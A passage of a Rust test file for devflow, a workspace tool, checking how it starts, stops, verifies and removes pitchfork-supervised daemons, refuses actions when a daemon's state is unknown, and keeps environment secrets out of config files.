    // supervisor is down: devflow has nothing to go on.
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    fake.set("supervisor_down", "1");
    assert_eq!(recorded_ids(&t, &ws), None);
    let report = down(&t, &fake, &ws, false).unwrap();
    assert!(report.ok(), "{report:?}");
    assert!(
        report
            .warnings
            .iter()
            .any(|w| w.contains("devflow started no daemons here")
                && w.contains("started outside devflow can't be checked")),
        "{:?}",
        report.warnings
    );
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("devflow started no daemons here")),
        "{:?}",
        out.warnings
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
}

#[test]
fn a_verified_stop_accounts_for_the_daemons_devflow_started() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    started_by_devflow(&t, &fake, &ws);
    assert!(recorded_ids(&t, &ws).is_some());

    // A stop that pitchfork did not carry out (the daemon still runs) accounts
    // for nothing: the record stays.
    fake.unset("after_stop.json");
    fake.set("stop_fail", "could not stop web\n");
    let report = down(&t, &fake, &ws, false).unwrap();
    assert!(!report.ok(), "{report:?}");
    assert!(
        recorded_ids(&t, &ws).is_some(),
        "an unverified stop keeps it"
    );
    fake.unset("stop_fail");

    // A stop whose result was read back and shows nothing running clears it.
    let ns = namespace_of(&t, &ws);
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "stopped", None, Some(3000))]),
    );
    let report = down(&t, &fake, &ws, false).unwrap();
    assert!(report.ok(), "{report:?}");
    assert_eq!(recorded_ids(&t, &ws), None);

    // With the record gone, a down supervisor is only a warning again.
    fake.set("supervisor_down", "1");
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("devflow started no daemons here")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn a_restart_records_the_start_again_and_a_supervisor_that_is_up_changes_nothing() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = started_by_devflow(&t, &fake, &ws);
    // With the supervisor up the listing decides, as before: the daemon is
    // stopped by the removal, and the record goes with the workspace.
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.stopped_daemons, [format!("{ns}/web")]);
    assert!(!ws.path.exists());

    // A restart stops (clearing the record) and starts (recording it again).
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "again", true);
    let ns = started_by_devflow(&t, &fake, &ws);
    let report = processes::restart_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &fake.start_options(&ws),
        &StopOptions::default(),
    )
    .unwrap();
    assert!(report.ok(), "{report:?}");
    assert_eq!(recorded_ids(&t, &ws), Some(vec![format!("{ns}/web")]));
}

// --- states devflow does not know ------------------------------------------------

#[test]
fn a_state_devflow_does_not_know_is_not_a_stopped_daemon() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    // The workspace's daemon is listed in a state that is neither running nor
    // a known way of not running, with a pid: it used to read as inactive and
    // `plan_removal` answered "nothing to stop".
    for odd in [
        listed(&ns, "web", "unknown", Some(4242), Some(3000)),
        listed(&ns, "web", "paused", Some(4242), Some(3000)),
        // The status is missing, not text, or the pid is not a number.
        json!({"id": format!("{ns}/web"), "pid": 4242}),
        json!({"id": format!("{ns}/web"), "status": 7, "pid": 4242}),
        json!({"id": format!("{ns}/web"), "status": "stopped", "pid": "4242"}),
        // An id without a namespace, or one that contradicts its namespace field.
        json!({"id": "web", "status": "stopped"}),
        json!({"id": format!("{ns}/web"), "namespace": "df-other", "status": "stopped"}),
    ] {
        fake.json("list.json", &json!([odd.clone()]));
        fake.clear_calls();
        let plan = processes::plan_removal(Some(&fake.pitchfork()), &t.project, &ws, false);
        let Err(Refusal::StateUnknown { detail, .. }) = &plan else {
            panic!("{odd}: not state_unknown: {plan:?}");
        };
        assert!(detail.contains("cannot be relied on"), "{odd}: {detail}");
        let error = setup::remove(
            &t.project,
            "feature",
            removal_options(&fake, false),
            &mut NoProgress,
        )
        .unwrap_err();
        let protected = error
            .downcast_ref::<devflow_core::error::Protected>()
            .unwrap_or_else(|| panic!("{error:#}"));
        assert!(protected.forceable, "{odd}: {}", protected.reason);
        assert!(ws.path.exists() && fake.mutations().is_empty(), "{odd}");
        // `down` refuses too.
        let error = down(&t, &fake, &ws, false).unwrap_err();
        assert!(
            matches!(refusal(&error), Refusal::StateUnknown { .. }),
            "{odd}: {error:#}"
        );
        assert!(fake.mutations().is_empty(), "{odd}");
    }

    // An entry that cannot be read at all cannot be attributed to anyone.
    fake.json(
        "list.json",
        &json!([listed("df-other", "web", "stopped", None, None), "junk"]),
    );
    assert!(matches!(
        processes::plan_removal(Some(&fake.pitchfork()), &t.project, &ws, false),
        Err(Refusal::StateUnknown { .. })
    ));

    // Forced, it goes on knowing it does not know: the declared daemons are
    // asked to stop, and the removal says it could not see the result.
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "unknown", Some(4242), Some(3000))]),
    );
    fake.clear_calls();
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("could not read what pitchfork runs")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn a_stop_is_not_verified_over_a_state_devflow_does_not_know() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    // The stop runs, and the listing afterwards puts the daemon in a state
    // devflow does not know: not "stopped", so not a verified stop.
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "unknown", Some(4242), Some(3000))]),
    );
    let report = down(&t, &fake, &ws, false).unwrap();
    assert!(!report.ok(), "{report:?}");
    assert!(
        report
            .state_error
            .as_deref()
            .is_some_and(|e| e.contains("does not recognise")),
        "{report:?}"
    );
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        error
            .downcast_ref::<devflow_core::error::Protected>()
            .is_some(),
        "{error:#}"
    );
    assert!(ws.path.exists());
}

#[test]
fn every_known_way_of_not_running_still_lets_a_removal_through() {
    for state in ["stopped", "errored", "failed", "available"] {
        let fake = Fake::new();
        let t = repo(Some(WEB), "");
        let ws = ready(&t, "feature", true);
        let ns = namespace_of(&t, &ws);
        fake.json(
            "list.json",
            &json!([listed(&ns, "web", state, None, Some(3000))]),
        );
        assert!(
            processes::plan_removal(Some(&fake.pitchfork()), &t.project, &ws, false)
                .unwrap()
                .is_none(),
            "{state}"
        );
        let out = setup::remove(
            &t.project,
            "feature",
            removal_options(&fake, false),
            &mut NoProgress,
        )
        .unwrap();
        assert!(!ws.path.exists() && out.warnings.is_empty(), "{state}");
        assert!(fake.mutations().is_empty(), "{state}");
    }
}

// --- no pitchfork on PATH ----------------------------------------------------------

#[test]
fn a_removal_without_pitchfork_proceeds_and_says_it_could_not_check() {
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    // devflow wrote its namespace file here, so daemons may exist somewhere
    // this machine cannot ask about.
    let stop = processes::plan_removal(None, &t.project, &ws, false)
        .unwrap()
        .expect("a warning");
    assert!(stop.daemons().is_empty());
    let (stopped, warnings) = processes::stop_for_removal(&t.project, &ws, &stop, false).unwrap();
    assert!(stopped.is_empty());
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("pitchfork isn't on PATH")
                && w.contains("couldn't check this workspace's daemons")),
        "{warnings:?}"
    );

    // A recorded start is enough, without devflow's namespace file.
    std::fs::remove_file(ws.path.join(processes::LOCAL_FILE)).unwrap();
    assert!(
        processes::plan_removal(None, &t.project, &ws, false)
            .unwrap()
            .is_none(),
        "no namespace file and no record: nothing to say"
    );
    let process_lock = processes::process_lock(&ws).unwrap();
    devflow_core::receipt::Receipt::update_processes(
        &ws.git_dir,
        &ws.name,
        &t.project.config,
        &process_lock,
        |record| {
            *record = Some(devflow_core::receipt::ProcessRecord {
                started_at: chrono::Utc::now(),
                ids: vec!["df-a-b/web".into()],
            })
        },
    )
    .unwrap();
    drop(process_lock);
    assert!(
        processes::plan_removal(None, &t.project, &ws, false)
            .unwrap()
            .is_some()
    );

    // A workspace with no pitchfork files and no start, and one devflow never
    // set up, have nothing to say.
    let plain = repo(None, "");
    let ws = ready(&plain, "plain", true);
    assert!(
        processes::plan_removal(None, &plain.project, &ws, false)
            .unwrap()
            .is_none()
    );
    let main = worktree::list(&t.project).unwrap().remove(0);
    assert!(
        processes::plan_removal(None, &t.project, &main, false)
            .unwrap()
            .is_none()
    );
}

// --- autostart ---------------------------------------------------------------

#[test]
fn autostart_is_off_unless_the_project_asks_for_it() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    assert!(
        processes::autostart_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                timeout: Duration::from_secs(5),
                ..fake.start_options(&ws)
            },
        )
        .is_none()
    );
    assert!(fake.calls().is_empty(), "{:?}", fake.calls());
}

#[test]
fn autostart_starts_an_approved_ready_workspace_and_explains_every_refusal() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "[pitchfork]\nautostart = true\n");
    assert!(t.project.config.pitchfork.autostart);
    // Not approved: skipped, with the reason.
    let ws = ready(&t, "feature", false);
    let outcome = processes::autostart_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            timeout: Duration::from_secs(5),
            ..fake.start_options(&ws)
        },
    )
    .unwrap();
    assert!(outcome.report.is_none());
    assert!(
        matches!(outcome.refusal, Some(Refusal::NotApproved { .. })),
        "{outcome:?}"
    );
    assert!(outcome.skipped.as_deref().unwrap().contains("approve"));
    assert!(fake.mutations().is_empty());
    // Approved: started.
    approve_workspace(&t, &ws);
    let outcome = processes::autostart_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            timeout: Duration::from_secs(5),
            ..fake.start_options(&ws)
        },
    )
    .unwrap();
    assert!(
        outcome.report.as_ref().is_some_and(|r| r.ran),
        "{outcome:?}"
    );
    assert_eq!(
        fake.mutations(),
        [format!("start -q {}/web", namespace_of(&t, &ws))]
    );
    // A workspace of a project without pitchfork files: nothing to report.
    let plain = repo(None, "[pitchfork]\nautostart = true\n");
    let plain_ws = ready(&plain, "p", false);
    assert!(
        processes::autostart_with(
            Some(&fake.pitchfork()),
            &plain.project,
            &plain_ws,
            &StartOptions {
                timeout: Duration::from_secs(5),
                ..fake.start_options(&plain_ws)
            },
        )
        .is_none()
    );
}

#[test]
fn autostart_does_nothing_in_bulk_while_a_daemon_starts_on_its_own() {
    let fake = Fake::new();
    let t = repo(
        Some(
            "[daemons.web]\nrun = \"a\"\n[daemons.tick]\nrun = \"b\"\ncron = { schedule = \"* * * * *\" }\n",
        ),
        "[pitchfork]\nautostart = true\n",
    );
    let ws = ready(&t, "feature", true);
    let outcome = processes::autostart_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            timeout: Duration::from_secs(5),
            ..fake.start_options(&ws)
        },
    )
    .unwrap();
    assert!(
        matches!(outcome.refusal, Some(Refusal::AutonomousTriggers { .. })),
        "{outcome:?}"
    );
    assert!(fake.mutations().is_empty());
    // The status says why autostart is off for this workspace.
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert!(status.autostart);
    assert!(
        status
            .autostart_blocked
            .as_deref()
            .unwrap()
            .contains("tick (cron)"),
        "{:?}",
        status.autostart_blocked
    );
    assert!(!status.can_start.allowed);
    // A plain daemon can still be started by name; the one with a trigger cannot.
    let startable = |name: &str| {
        status
            .daemons
            .iter()
            .find(|d| d.name == name)
            .unwrap()
            .startable
    };
    assert!(
        startable("web") && !startable("tick"),
        "{:?}",
        status.daemons
    );
}

// --- status ------------------------------------------------------------------

#[test]
fn status_lists_only_this_namespace_and_matches_urls_by_worktree_directory() {
    let fake = Fake::new();
    let t = repo(
        Some("[daemons.web]\nrun = \"a\"\nport = 3000\n[daemons.api]\nrun = \"b\"\n"),
        "",
    );
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.json(
        "list.json",
        &json!([
            listed(&ns, "web", "running", Some(10), Some(3000)),
            listed("df-other-ns", "web", "running", Some(11), Some(3001)),
            listed(&ns, "gone", "stopped", None, None),
        ]),
    );
    fake.json(
        "proxy.json",
        &json!({
            "enabled": true, "scheme": "https", "tld": "localhost", "port": 443, "trusted": true,
            "projects": [
                {"project": ns, "dir": ws.path.canonicalize().unwrap(),
                 "daemons": [{"daemon": "web", "url": "https://web.mine.localhost", "port": 3000}]},
                {"project": "df-other-ns", "dir": "/elsewhere",
                 "daemons": [{"daemon": "web", "url": "https://web.other.localhost", "port": 3001}]}
            ]
        }),
    );
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert!(status.installed && status.configured);
    assert_eq!(status.version.as_deref(), Some("2.29.0"));
    assert_eq!(status.supervisor_up, Some(true));
    assert_eq!(status.namespace.value, ns);
    let names: Vec<&str> = status.daemons.iter().map(|d| d.name.as_str()).collect();
    assert_eq!(names, ["api", "gone", "web"], "{:?}", status.daemons);
    let by = |name: &str| status.daemons.iter().find(|d| d.name == name).unwrap();
    assert_eq!(by("api").state, "not started");
    assert!(by("api").configured && !by("gone").configured);
    assert_eq!(by("web").url.as_deref(), Some("https://web.mine.localhost"));
    assert_eq!(by("web").pid, Some(10));
    assert!(status.can_start.allowed && status.can_stop.allowed);
    // Running daemons are not startable again; the declared one that is not running is.
    assert!(by("api").startable && !by("web").startable);
    assert!(status.proxy.as_ref().is_some_and(|p| p.enabled));
    assert!(status.error.is_none());
    // Everything was read: this is an observation.
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    assert!(status.observation.reasons.is_empty());
}

#[test]
fn a_status_says_when_what_runs_was_not_observed() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    let observation =
        || processes::status_with(Some(&fake.pitchfork()), &t.project, &ws).observation;

    // A supervisor that is down while devflow started nothing: nothing runs.
    fake.set("supervisor_down", "1");
    assert!(observation().is_complete(), "{:?}", observation());
    fake.unset("supervisor_down");

    // A listing that failed.
    fake.set("list_fail", "1");
    let failed = observation();
    assert!(!failed.is_complete(), "{failed:?}");
    assert!(failed.reasons[0].contains("list"), "{failed:?}");
    fake.unset("list_fail");

    // Entries that could not be read, or a state devflow does not know: the
    // judgement a stop makes, and the same sentence.
    for odd in [
        json!({"status": "running"}),
        listed(&ns, "web", "unknown", Some(4242), Some(3000)),
        json!({"id": format!("{ns}/web"), "pid": 4242}),
        json!({"id": "web", "status": "stopped"}),
    ] {
        fake.json("list.json", &json!([odd.clone()]));
        let seen = observation();
        assert!(!seen.is_complete(), "{odd}: {seen:?}");
        assert!(
            seen.summary().unwrap().contains("cannot be relied on"),
            "{odd}: {seen:?}"
        );
    }
    // A listing that is fine again is an observation again.
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "stopped", None, None)]),
    );
    assert!(observation().is_complete());

    // No pitchfork at all: nothing was asked.
    let none = processes::status_with(None, &t.project, &ws);
    assert!(!none.observation.is_complete());
    assert!(none.observation.reasons[0].contains("pitchfork cannot be used"));
}

#[test]
fn a_supervisor_that_died_with_daemons_devflow_started_leaves_the_status_unobserved() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = started_by_devflow(&t, &fake, &ws);
    // The supervisor crashes: it says "down", the daemon lives on, and the
    // status has no listing to show it.
    fake.set("supervisor_down", "1");
    fake.clear_calls();
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert_eq!(status.supervisor_up, Some(false));
    assert!(status.daemons.iter().all(|d| d.state == "not started"));
    assert!(!status.observation.is_complete());
    let why = status.observation.summary().unwrap();
    assert!(
        why.contains("supervisor is down")
            && why.contains("has not seen stop")
            && why.contains(&format!("{ns}/web")),
        "{why}"
    );
    // The gate to stop stays open: core answers it with the forceable
    // `state_unknown`, which is what a frontend offers instead of disabling.
    assert!(status.can_stop.allowed, "{:?}", status.can_stop);
    let error = down(&t, &fake, &ws, false).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::StateUnknown { .. }),
        "{error:#}"
    );

    // Once the supervisor is back and shows the daemon, it is observed.
    fake.unset("supervisor_down");
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    assert!(status.daemons.iter().any(|d| d.is_active()));
}

#[test]
fn status_without_a_supervisor_or_pitchfork_still_lists_the_declared_daemons() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    fake.set("supervisor_down", "1");
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert_eq!(status.supervisor_up, Some(false));
    assert!(
        status
            .daemons
            .iter()
            .any(|d| d.name == "web" && d.state == "not started")
    );
    assert!(fake.calls().iter().all(|c| !c.1.starts_with("list --json")));

    let missing = processes::status_with(None, &t.project, &ws);
    assert!(!missing.installed);
    assert!(!missing.can_start.allowed);
    assert!(matches!(
        missing.can_start.refusal,
        Some(Refusal::NotInstalled { .. })
    ));
    assert_eq!(missing.daemons.len(), 1);
}

// --- environment delivery -------------------------------------------------------

#[test]
fn daemons_without_the_mise_wiring_are_reported() {
    let t = repo(
        Some("[daemons.web]\nrun = \"a\"\nmise = true\n[daemons.worker]\nrun = \"b\"\n"),
        "[services.db]\nengine = \"postgres\"\n",
    );
    let dir = t.root.clone();
    let problems = processes::env_wiring(&t.project, &dir);
    assert_eq!(problems.len(), 2, "{problems:?}");
    assert!(problems[0].contains("worker") && problems[0].contains("mise = true"));
    assert!(!problems[0].contains("web"));
    assert!(problems[1].contains("_.file"));

    // Wired: every daemon under mise, and mise loads the workspace's file.
    std::fs::write(
        dir.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"a\"\nmise = true\n",
    )
    .unwrap();
    std::fs::write(dir.join("mise.toml"), "[env]\n_.file = \".devflow/env\"\n").unwrap();
    assert!(processes::env_wiring(&t.project, &dir).is_empty());
    // A path that names one checkout is not the workspace's file.
    std::fs::write(
        dir.join("mise.toml"),
        "[env]\n_.file = \"/home/me/shop/.devflow/env\"\n",
    )
    .unwrap();
    assert_eq!(processes::env_wiring(&t.project, &dir).len(), 1);
    // A project with nothing to deliver is not nagged.
    let bare = repo(Some("[daemons.web]\nrun = \"a\"\n"), "");
    assert!(processes::env_wiring(&bare.project, &bare.root).is_empty());
}

#[test]
fn devflow_never_puts_environment_into_pitchfork_files() {
    // Recipes carry the secrets here (no database: that would start a real
    // PostgreSQL container and leave it behind).
    let t = repo(
        Some(WEB),
        "[env]\nTOKEN = \"hunter2\"\nDIRECT = \"postgres://app:hunter3@db.example/app\"\n",
    );
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "feature");
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let ws = out.workspace;
    // The values do reach .devflow/env, so there is something to keep out.
    let env = std::fs::read_to_string(ws.path.join(".devflow/env")).unwrap();
    assert!(env.contains("hunter2") && env.contains("hunter3"), "{env}");
    for file in ["pitchfork.local.toml", "pitchfork.toml"] {
        let text = std::fs::read_to_string(ws.path.join(file)).unwrap();
        assert!(
            !text.contains("hunter2") && !text.contains("hunter3") && !text.contains("TOKEN"),
            "{file}: {text}"
        );
        assert!(
            !text.contains("[env]") && !text.contains("DATABASE_URL"),
            "{file}: {text}"
        );
    }
}

// --- install guidance ---------------------------------------------------------

#[test]
fn install_guidance_prints_commands_and_runs_nothing() {
    let plan = pitchfork::install_plan();
    assert!(
        plan.commands
            .iter()
            .any(|c| c.contains("mise use -g pitchfork@latest"))
    );
    assert!(plan.commands.iter().any(|c| c.contains("brew")));
    assert!(plan.commands.iter().any(|c| c.contains("cargo install")));
    // The proxy is only ever printed.
    assert!(
        pitchfork::PROXY_COMMANDS
            .iter()
            .any(|c| c.contains("proxy setup"))
    );
    let _ = Receipt::new(uuid::Uuid::new_v4(), "x", None);
}

#[test]
fn a_report_judges_only_what_was_asked() {
    let fake = Fake::new();
    let t = repo(
        Some("[daemons.web]\nrun = \"a\"\n[daemons.bad]\nrun = \"b\"\n"),
        "",
    );
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    let errored = json!({
        "id": format!("{ns}/bad"), "namespace": ns, "name": "bad", "pid": null,
        "status": "errored", "error": "exit code 3", "port": []
    });
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "available", None, None), errored.clone()]),
    );
    fake.json(
        "after_start.json",
        &json!([
            listed(&ns, "web", "running", Some(9), None),
            errored.clone()
        ]),
    );
    // Asked for web alone: bad's old failure is not this start's news.
    let report = processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            only: vec!["web".into()],
            ..fake.start_options(&ws)
        },
    )
    .unwrap();
    assert_eq!(report.requested, ["web"]);
    assert!(report.ok(), "{report:?}");
    // Asked for everything, bad fails to start: the start did not succeed.
    fake.json(
        "list.json",
        &json!([
            listed(&ns, "web", "available", None, None),
            listed(&ns, "bad", "available", None, None)
        ]),
    );
    let report = start(&t, &fake, &ws).unwrap();
    assert!(!report.ok(), "{report:?}");
    // A stop is judged by what still runs; an errored daemon is not running.
    fake.json(
        "list.json",
        &json!([
            listed(&ns, "web", "running", Some(9), None),
            errored.clone()
        ]),
    );
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "stopped", None, None), errored.clone()]),
    );
    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
    assert!(report.ok(), "{report:?}");
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "running", Some(9), None)]),
    );
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "running", Some(9), None)]),
    );
    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
    assert!(!report.ok(), "a daemon that did not stop: {report:?}");
}

// --- one operation at a time ---------------------------------------------------
//
// A start records its intent, then asks pitchfork (which can take a minute). A
// stop that slipped in between would read "nothing runs", clear the record and
// leave a supervisor crash with no trace of the start. The process lock (a file
// lock in the Git directory, taken before the receipt lock) serialises start,
// stop, restart, removal and `setup --new-instance` through effect and
// verification.

/// Wait until the receipt records a start (the start is between its record and
/// its effect, or past it).
fn wait_for_record(t: &Repo, ws: &Workspace) {
    let deadline = Instant::now() + Duration::from_secs(10);
    while recorded_ids(t, ws).is_none() {
        assert!(Instant::now() < deadline, "the start never recorded itself");
        std::thread::sleep(Duration::from_millis(20));
    }
}

#[test]
fn a_stop_waits_for_a_start_in_progress_instead_of_erasing_its_record() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.json(
        "after_start.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "stopped", None, Some(3000))]),
    );
    // pitchfork takes a second to answer the start.
    fake.set("start_sleep", "1");
    let (started, stopped) = std::thread::scope(|scope| {
        let starting = scope.spawn(|| start(&t, &fake, &ws));
        wait_for_record(&t, &ws);
        // The start is under way; the stop gets the lock when it is done.
        let stopped = down(&t, &fake, &ws, false);
        (starting.join().unwrap(), stopped)
    });
    let started = started.unwrap();
    assert!(started.ok(), "{started:?}");
    let stopped = stopped.unwrap();
    assert!(stopped.ok(), "{stopped:?}");
    // One after the other, in that order: the stop saw the daemon the start
    // brought up and stopped it, and only then cleared the record.
    assert_eq!(
        fake.mutations(),
        [format!("start -q {ns}/web"), format!("stop {ns}/web"),]
    );
    assert_eq!(recorded_ids(&t, &ws), None, "a verified stop clears it");
}

#[test]
fn an_operation_that_cannot_get_the_process_lock_fails_with_busy_and_changes_nothing() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.json(
        "after_start.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "stopped", None, Some(3000))]),
    );
    // Longer than any caller waits for the lock.
    fake.set("start_sleep", "4");
    let is_busy = |error: &anyhow::Error| {
        error
            .downcast_ref::<devflow_core::error::Busy>()
            .is_some_and(|busy| busy.with == devflow_core::error::BusyWith::Processes)
    };
    let (started, results) = std::thread::scope(|scope| {
        let starting = scope.spawn(|| start(&t, &fake, &ws));
        wait_for_record(&t, &ws);
        // Everything that would start, stop, replace or delete the workspace's
        // daemons at the same time, each waiting for the lock at once.
        let stop = scope.spawn(|| down(&t, &fake, &ws, true).map(|_| ()));
        let second_start = scope.spawn(|| start(&t, &fake, &ws).map(|_| ()));
        let restart = scope.spawn(|| {
            processes::restart_with(
                Some(&fake.pitchfork()),
                &t.project,
                &ws,
                &fake.start_options(&ws),
                &StopOptions::default(),
            )
            .map(|_| ())
        });
        let replace = scope.spawn(|| {
            setup::setup(
                &t.project,
                &ws,
                SetupOptions::default(),
                false,
                true,
                &mut NoProgress,
            )
            .map(|_| ())
        });
        let remove = scope.spawn(|| {
            setup::remove(
                &t.project,
                "feature",
                removal_options(&fake, true),
                &mut NoProgress,
            )
            .map(|_| ())
        });
        let results: Vec<(&str, anyhow::Result<()>)> = vec![
            ("down", stop.join().unwrap()),
            ("up", second_start.join().unwrap()),
            ("restart", restart.join().unwrap()),
            ("setup --new-instance", replace.join().unwrap()),
            ("remove", remove.join().unwrap()),
        ];
        (starting.join().unwrap(), results)
    });
    for (what, result) in results {
        let error = result.expect_err(what);
        assert!(is_busy(&error), "{what}: not Busy: {error:#}");
    }
    let started = started.unwrap();
    assert!(started.ok(), "{started:?}");
    // Nothing else ran, the record of the start is intact, the workspace is
    // still the same instance and still there.
    assert_eq!(fake.mutations(), [format!("start -q {ns}/web")]);
    assert_eq!(recorded_ids(&t, &ws), Some(vec![format!("{ns}/web")]));
    assert_eq!(namespace_of(&t, &ws), ns);
    assert!(ws.path.exists());
    // Once it is over, the lock is free and a stop clears the record.
    let stopped = down(&t, &fake, &ws, false).unwrap();
    assert!(stopped.ok(), "{stopped:?}");
    assert_eq!(recorded_ids(&t, &ws), None);
}

// --- replacing the instance identity ---------------------------------------------
//
// The namespace `df-<project8>-<instance8>` comes from the receipt's instance id.
// `setup --new-instance` replaces it, so daemons still running under the old one
// would be out of reach of `down` and `remove`.

const CHILD: &str = "DEVFLOW_TEST_CHILD";

/// Environment variables are process-wide, so a test about one runs alone in a
/// child process started with it set. `true` inside the child (run the body);
/// in the parent it runs the child and asserts that it passed.
fn in_child(test: &str, env: &[(&str, &str)]) -> bool {
    if std::env::var_os(CHILD).is_some() {
        return true;
    }
    let output = std::process::Command::new(std::env::current_exe().unwrap())
        .args([test, "--exact", "--nocapture", "--test-threads=1"])
        .envs(env.iter().copied())
        .env(CHILD, "1")
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success() && stdout.contains("1 passed"),
        "child run of {test} failed:\n{stdout}\n{stderr}"
    );
    false
}

/// `devflow setup --new-instance` in `ws`, asking `fake`'s pitchfork.
fn new_instance(t: &Repo, fake: &Fake, ws: &Workspace) -> anyhow::Result<()> {
    setup::setup(
        &t.project,
        ws,
        SetupOptions {
            pitchfork: Some(fake.pitchfork()),
            ..SetupOptions::default()
        },
        false,
        true,
        &mut NoProgress,
    )
    .map(|outcome| assert!(outcome.is_some()))
}

fn instance_of(t: &Repo, ws: &Workspace) -> uuid::Uuid {
    setup::receipt(&t.project, ws).unwrap().unwrap().instance_id
}

#[test]
fn a_new_instance_is_refused_while_the_old_identitys_daemons_run() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let old = instance_of(&t, &ws);
    let ns = started_by_devflow(&t, &fake, &ws);
    fake.clear_calls();

    let error = new_instance(&t, &fake, &ws).unwrap_err();
    let Refusal::DaemonsRunning { ids } = refusal(&error) else {
        panic!("not daemons_running: {error:#}");
    };
    assert_eq!(ids, &[format!("{ns}/web")]);
    let refused = refusal(&error);
    assert_eq!(refused.code(), "daemons_running");
    assert!(
        refused
            .hint()
            .unwrap()
            .contains("stop the workspace's processes"),
        "{:?}",
        refused.hint()
    );
    // Nothing changed: same identity, same namespace, same record, no effect.
    assert_eq!(instance_of(&t, &ws), old);
    assert_eq!(namespace_of(&t, &ws), ns);
    assert_eq!(recorded_ids(&t, &ws), Some(vec![format!("{ns}/web")]));
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // `devflow down` first, then the identity can be replaced.
    let report = down(&t, &fake, &ws, false).unwrap();
    assert!(report.ok(), "{report:?}");
    new_instance(&t, &fake, &ws).unwrap();
    assert_ne!(instance_of(&t, &ws), old);
    assert_ne!(namespace_of(&t, &ws), ns);
